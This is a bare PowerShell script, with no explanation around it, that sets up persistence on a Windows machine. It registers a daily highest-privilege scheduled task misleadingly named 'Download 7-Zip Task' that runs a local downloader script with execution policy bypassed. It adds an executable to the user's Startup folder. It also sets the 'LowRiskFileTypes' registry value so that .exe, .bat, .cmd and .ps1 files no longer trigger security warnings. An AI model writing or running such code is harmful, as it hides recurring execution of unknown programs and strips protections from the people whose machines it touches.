$taskName = "Download 7-Zip Task"
$scriptPath = "C:\x_test\server\ud\downlaoder.ps1"
$arguments = "-ExecutionPolicy Bypass -File ""C:\x_test\server\ud\downlaoder.ps1"""
$trigger = New-ScheduledTaskTrigger -Daily -At "12:00 AM"
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument $arguments

Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -RunLevel Highest

$executablePath = "C:\x_test\server\w_win.exe"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\StartupShortcut.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $executablePath
$shortcut.Save()

Write-Host "Executable added to Windows startup successfully."

$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"
$regValueName = "LowRiskFileTypes"
$regValueData = ".exe;.bat;.cmd;.ps1"

# Create or update the registry value
if (Test-Path $regKeyPath) {
    Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $regValueData
} else {
    New-Item -Path $regKeyPath | Out-Null
    New-ItemProperty -Path $regKeyPath -Name $regValueName -Value $regValueData
}
